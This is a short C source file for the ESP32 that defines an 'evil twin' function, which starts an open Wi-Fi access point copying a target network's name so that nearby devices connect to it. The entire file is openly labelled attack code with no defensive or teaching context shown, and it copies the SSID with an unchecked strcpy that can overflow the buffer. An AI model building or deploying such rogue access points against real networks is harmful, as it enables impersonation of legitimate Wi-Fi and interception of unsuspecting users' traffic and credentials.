#include "esp_wifi.h"
#include <string.h>
#include "esp_log.h"

static const char *TAG = "EVIL_TWIN";

void evil_twin_start(char *target_ssid) {
    wifi_config_t ap_config = {0};
    strcpy((char *)ap_config.ap.ssid, target_ssid);
    ap_config.ap.ssid_len = strlen(target_ssid);
    ap_config.ap.channel = 6;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    
    ESP_LOGI(TAG, "Evil Twin started: %s", target_ssid);
}
